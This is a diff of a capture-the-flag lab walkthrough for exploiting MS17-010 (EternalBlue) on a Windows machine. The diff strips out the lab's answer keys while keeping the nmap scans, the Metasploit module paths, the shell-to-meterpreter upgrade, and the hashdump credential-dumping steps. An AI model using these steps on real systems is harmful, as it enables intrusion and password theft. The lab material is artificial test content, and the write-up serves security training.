@@ -46,13 +46,9 @@ nmap -A -Pn -p 135,139,445,3389,5985,47001 TARGET_IP
 
 ### Q2 How many ports are open with a port number under 1000?
 
-==3==
-
 135, 139, 445
 
 ### Q3 What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
-
-==ms17-010==
 
 ```
 nmap -Pn -p 445 --script vuln TARGET_IP
@@ -77,15 +73,11 @@ Wait for the `msf >` prompt — the module index takes 10–30 s to load.
 
 ### Q5 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
 
-==exploit/windows/smb/ms17_010_eternalblue==
-
 ```
 search ms17-010
 ```
 
 ### Q6 Show options and set the one required value. What is the name of this value? (All caps for submission)
-
-==RHOSTS==
 
 ```
 use exploit/windows/smb/ms17_010_eternalblue
@@ -146,15 +138,11 @@ Prompts `Background session ... ? [y/N]` — enter **y**. Returns to the `msf` p
 
 ### Q9 If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)
 
-==post/multi/manage/shell_to_meterpreter==
-
 ```
 use post/multi/manage/shell_to_meterpreter
 ```
 
 ### Q10 Select this (use MODULE_PATH). Show options, what option are we required to change?
-
-==SESSION==
 
 ```
 show options
@@ -232,8 +220,6 @@ migrate <SYSTEM_PID>              ⚠ swap — PID from your own ps output, neve
 
 ### Q17 Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
 
-==Jon==
-
 ```
 hashdump
 ```
@@ -241,8 +227,6 @@ hashdump
 Line format is `username:RID:LMhash:NThash:::` — field 4 is the one to crack. `aad3b435b51404eeaad3b435b51404ee` in field 3 is the empty-LM placeholder, ignore it. RID 500 is the built-in Administrator, 501 is Guest; user-created accounts start at 1000+.
 
 ### Q18 Copy this password hash to a file and research how to crack it. What is the cracked password?
-
-==REDACTED==
 
 Run these on the attack box, in a separate terminal (or background meterpreter first):
 
